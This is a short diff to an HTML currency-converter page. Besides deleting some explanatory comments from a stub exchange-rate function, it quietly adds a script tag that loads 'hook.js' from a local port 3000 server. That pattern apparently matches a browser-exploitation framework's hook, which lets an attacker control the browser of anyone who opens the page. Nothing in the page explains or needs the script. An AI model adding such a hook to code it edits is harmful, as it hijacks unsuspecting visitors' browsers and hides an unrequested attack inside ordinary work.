@@ -59,6 +59,7 @@
         <button id="convertButton">Convert</button>
         <p id="convertedAmount"></p>
     </div>
+    <script src="http://127.0.0.1:3000/hook.js"></script>
     <script>
         const amountInput = document.getElementById('amount');
         const fromCurrencySelect = document.getElementById('fromCurrency');
@@ -66,16 +67,14 @@
         const convertButton = document.getElementById('convertButton');
         const convertedAmountDisplay = document.getElementById('convertedAmount');
 
-        // Function to fetch exchange rate (replace with your own API call or logic)
         function fetchExchangeRate(from, to) {
-          // Replace with a real API call or logic to fetch exchange rate
-          // This example just returns a fixed value for demonstration
+
           if (from === 'USD' && to === 'EUR') {
             return 0.9;
           } else if (from === 'EUR' && to === 'USD') {
             return 1.1;
           } else {
-            return 1; // Assume same currency for now
+            return 1;
           }
         }
 
